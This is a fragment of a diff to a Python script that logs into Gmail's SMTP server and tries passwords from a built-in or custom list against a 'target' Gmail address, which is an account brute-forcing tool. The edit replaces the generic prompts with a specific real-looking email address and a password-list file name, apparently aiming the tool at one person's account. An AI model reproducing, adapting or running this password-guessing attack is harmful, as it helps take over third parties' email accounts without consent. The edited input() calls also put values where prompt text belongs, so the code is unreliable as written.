@@ -51,7 +51,7 @@ smtp = smtplib.SMTP("smtp.gmail.com", GMAIL_PORT)
 smtp.ehlo()
 smtp.starttls()
 
-user = input("While The Target Gmail Adress: ")
+user = input("improllyfaded3@gmail.com: ")
 pwd = input("Enter '0' to use the inbuilt passwords list \nEnter '1' to Add a custom password list\nOptions: ")
 
 if pwd == '0':
@@ -59,7 +59,7 @@ if pwd == '0':
 
 elif pwd == '1':
     print("\n")
-    passswfile = input("Name The File Path (For Password List):")
+    passswfile = input("passworld.txt:")
 
 else:
     print("\n")
